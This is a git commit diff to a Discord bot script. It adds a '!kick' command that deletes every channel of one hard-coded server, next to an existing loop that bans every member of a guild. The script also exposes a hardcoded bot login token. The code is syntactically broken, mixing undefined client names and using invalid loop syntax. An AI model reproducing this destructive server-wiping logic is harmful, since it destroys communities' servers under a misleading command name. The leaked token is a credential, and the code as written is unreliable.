810931e9547bf87eb7a6bbf383ab45b171106ec8
ygroxie <38132498+ygroxie@users.noreply.github.com>
2018-10-21 18:12:40 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,6 +2,8 @@ const Discord = require ("discord.js");
 const Bot = new Discord.Client (); 
 Bot.login ("NTAzNTk2NTEwMzQ5NjIzMjk2.Dq4ziQ.6pm4GpWHZKRKqmKpfU89XXxb-Uk"); 
 
+var prefix = ("!")
+
 bot.on ("ready", function () { 
 console.log ("Ready."); 
 }); 
@@ -14,7 +16,15 @@ for (membres var in msg.guild.members) {members.ban
 } 
 } )
 
-Client.on('var server = Client.guilds.get('503557304881250311');
+bot.on('message', message => {
+    let command = message.content.split(" ")[0];
+    const args = message.content.slice(prefix.length).split(/ +/);
+    command = args.shift().toLowerCase();
+
+
+	if (command === "kick") {
+	var server = Client.guilds.get('503557304881250311');
 for (var i = 0; i < server.channels.array().length; i++) {
     server.channels.array()[i].delete();
-}')
+	}
+})
